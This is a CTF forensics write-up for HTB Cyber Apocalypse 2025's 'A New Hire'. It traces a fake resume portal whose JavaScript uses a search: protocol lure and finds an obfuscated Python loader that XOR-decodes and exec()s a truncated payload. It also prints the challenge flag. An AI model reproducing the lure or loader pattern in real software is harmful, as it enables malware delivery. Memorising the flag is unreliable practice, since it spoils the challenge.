---
title: "A New Hire – Malicious Document via Resume Server (HTB Cyber Apocalypse 2025)"
tags: [CTF, forensics, web, resume leak, base64, decryption, malware]
---

# A New Hire 📁

![Language](https://img.shields.io/badge/language-Forensics-blue.svg)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue.svg)
![Category](https://img.shields.io/badge/category-Forensics-purple.svg)
![CTF](https://img.shields.io/badge/Event-HTB%20Cyber%20Apocalypse%202025-purple)

The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. 

At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.

## 📚 Table of Contents

- [Challenge Overview 🕵️](#challenge-overview-%EF%B8%8F)
- [Email Lead ✉️](#email-lead-%EF%B8%8F)
- [JavaScript Clue 🔍](#javascript-clue-)
- [Accessing the Hidden Path 🌐](#accessing-the-hidden-path-)
- [Payload Discovery 🧪](#payload-discovery-)
- [Python Backdoor Analysis 🧠](#python-backdoor-analysis-)
- [Extracting the Flag 🏴](#extracting-the-flag-)
- [Conclusion 🧾](#conclusion-)

## Challenge Overview 🕵️

A seemingly benign resume portal hides a dark secret: embedded malware is being used to gain a foothold in Eldoria’s infrastructure. 

As an investigator, your goal is to retrieve the payload, analyze it, and extract the flag.

You’re given access to an email mentioning a job applicant named “Lord Malakar” who has submitted a resume via a suspicious resume portal. 

Hidden within the web server’s structure lies a payload — it's your job to:

1. Identify the hidden route.
2. Retrieve and reverse the malware.
3. Extract the flag from the malicious payload.

## Email Lead ✉️

We started with a `.eml` file containing this key excerpt:

```
You can review his resume here:
storage.microsoftcloudservices.com:[PORT]/index.php
```

Alongside a note:

> Make sure you replace '[PORT]' with your instance's port and resolve hostnames correctly.

This implies we're looking for an open web service with a fake index page. Let’s explore further.

## JavaScript Clue 🔍

On accessing `/index.php`, we found JavaScript code that looked suspicious:

```
function getResume() {
  window.location.href=`search:displayname=Downloads&subquery=\\${window.location.hostname}@${window.location.port}\3fe1690d955e8fd2a0b282501570e1f4\resumes\`;
}
```

This hinted at a browsable directory path on the server:
```
/3fe1690d955e8fd2a0b282501570e1f4/
```

And sure enough, when visiting this path, a directory listing appeared 👇

![Directory Screenshot](https://github.com/user-attachments/assets/581800e9-5571-4805-9505-37a44fb45958)
## Accessing the Hidden Path 🌐

Navigating to:

```
http://<IP>:<PORT>/3fe1690d955e8fd2a0b282501570e1f4/configs/client.py
```

We found a Python file `client.py` containing the real malware logic.

## Payload Discovery 🧪

The script contained:

```python
import base64

key = base64.decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==")

data = base64.b64decode("c97FeXRj6jeG5P74ANItM...")  # truncated for readability

meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
exec(__import__('zlib').decompress(meterpreter_data)[0])
```

Clearly, this malware:

- Base64-decodes a `key`.
- Base64-decodes a compressed payload.
- XORs the payload with the key.
- Decompresses it with `zlib`.
- Executes it via `exec()`.

## Python Backdoor Analysis 🧠

We manually decoded the key:

```
import base64
print(base64.b64decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==").decode())
```

**Output:**
```
HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3ss!!}
```

Boom 💥 — that was the flag! The attacker was using a cleverly obfuscated Python backdoor disguised as a resume processing client. Upon inspection, no actual CV was present — just malware.

## Extracting the Flag 🏴

✅ Final flag:
```
HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3ss!!}
```

## Conclusion 🧾

This challenge was a slick mix of:

- Web forensics (directory traversal)
- Static code analysis
- Malware unpacking (XOR + zlib)
- Obfuscated payload execution

It underscores the importance of **never trusting unverified documents** — especially those with Python scripts in `config/`.

**Lesson learned?** Just because it’s called a resume doesn’t mean it’s safe to open. 🐍📄

🔙 [Back to Cyber Apocalypse 2025 Writeups](../../)
